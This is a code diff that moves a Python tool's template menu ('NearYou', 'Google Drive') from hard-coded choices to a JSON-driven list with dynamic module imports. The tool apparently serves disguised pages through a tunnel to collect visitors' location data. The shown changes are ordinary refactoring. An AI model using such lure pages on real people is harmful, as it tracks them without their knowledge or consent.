@@ -31,7 +31,7 @@ row = []
 site = ''
 info = ''
 result = ''
-version = '1.2.2'
+version = '1.2.3'
 
 def banner():
 	print (G +
@@ -76,24 +76,33 @@ def tunnel_select():
 def template_select():
 	global site, info, result
 	print(G + '[+]' + C + ' Select a Template : ' + W + '\n')
-	print(G + '[1]' + C + ' NearYou' + W)
-	print(G + '[2]' + C + ' Google Drive' + W)
+	
+	with open('template/templates.json', 'r') as templ:
+		templ_info = templ.read()
+	
+	templ_json = json.loads(templ_info)
+	
+	for item in templ_json['templates']:
+		name = item['name']
+		print(G + '[{}]'.format(templ_json['templates'].index(item)) + C + ' {}'.format(name) + W)
+	
 	selected = int(input(G + '[>] ' + W))
 	
-	if selected == 1:
-		site = 'nearyou'
-		print('\n' + G + '[+]' + C + ' Loading NearYou Template...' + W)
-	elif selected == 2:
-		site = 'gdrive'
-		print('\n' + G + '[+]' + C + ' Loading Google Drive Template...' + W)
-		redirect = input(G + '[+]' + C + ' Enter GDrive File URL : ' + W)
-		with open('template/gdrive/js/location_temp.js', 'r') as js:
-			reader = js.read()
-			update = reader.replace('REDIRECT_URL', redirect)
-		with open('template/gdrive/js/location.js', 'w') as js_update:
-			js_update.write(update)
+	try:
+		site = templ_json['templates'][selected]['dir_name']
+	except IndexError:
+		print('\n' + R + '[-]' + C + ' Invalid Input!' + W + '\n')
+		sys.exit()
+	
+	print('\n' + G + '[+]' + C + ' Loading {} Template...'.format(templ_json['templates'][selected]['name']) + W + '\n')
+	
+	module = templ_json['templates'][selected]['module']
+	if module == True:
+		imp_file = templ_json['templates'][selected]['import_file']
+		import importlib
+		importlib.import_module('template.{}'.format(imp_file))
 	else:
-		print(R + '[-]' + C + ' Invalid Input, Only Numbers Accepted' + W + '\n')
+		pass
 
 	info = 'template/{}/php/info.txt'.format(site)
 	result = 'template/{}/php/result.txt'.format(site)
